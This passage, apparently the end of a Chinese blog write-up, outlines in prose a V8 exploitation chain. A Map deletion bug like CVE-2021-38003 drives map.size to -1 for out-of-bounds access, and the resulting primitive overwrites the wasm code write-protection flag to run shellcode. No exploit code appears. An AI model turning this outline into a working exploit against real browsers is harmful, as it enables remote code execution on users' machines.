<h1><a id="_223"></a>漏洞利用</h1>
<h2><a id="OOB_224"></a>OOB</h2>
<p>越界方法与CVE 2021-38003利用方法一致，概括一下就是因为当Map删除元素时会将该元素key和value都写入hole并将map.size-1，当map中有一个key为hole和一个key为正常数字的元素的时候，可以删除两次key为hole的元素，当第一次删除hole key时map.size-1=1然后将hole key与hole value写入，当第二次删除hole key时map.size将为0，当删除key为正常数字的元素时map.size就会变成0-1最终使map.size等于-1，详细说明：<a href="https://zhuanlan.zhihu.com/p/491222313">CVE 2021-38003</a></p>
<h2><a id="WASM_226"></a>绕过WASM写保护</h2>
<p>通过调试与查找找到FLAG_ wasm_ write_ protect_ code_ Memory标志，查看该标志的引用发现此标志与wasm可执行内存的写入权限，通过前面越界利用实现的读写原语可将此标志改写为true即可打开wasm可执行地址的写权限，然后直接写入shellcode执行即可。<br>
<img src="https://img-blog.csdnimg.cn/d82d28984f5d47d9988dedc6d9e4afe7.png" alt="在这里插入图片描述"></p>
</div>
</body>

</html>
